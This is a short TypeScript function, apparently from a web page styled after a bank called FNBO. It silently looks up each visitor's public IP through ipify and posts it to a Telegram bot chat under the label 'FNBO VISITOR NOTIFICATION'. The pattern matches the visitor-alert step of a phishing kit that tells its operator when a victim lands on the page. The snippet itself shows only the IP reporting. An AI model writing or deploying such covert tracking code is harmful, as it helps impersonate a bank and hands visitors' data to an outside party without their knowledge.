export const visitorNotification = async () => {
    
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;

    const tele_url = `https://api.telegram.org/bot${import.meta.env.VITE_TELEGRAM_TOKEN}/sendMessage`;
    const message = `
    FNBO VISITOR NOTIFICATION
        Address:- ${visitorIP}
        `
    await fetch(tele_url, {
        method: "POST",
        headers: {
            accept: "application/json",
            'Content-Type': 'application/json',
            "User-Agent":
                "Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)",
        },
        body: JSON.stringify({
            chat_id: import.meta.env.VITE_TELEGRAM_ID,
            text: message
        })
    })
}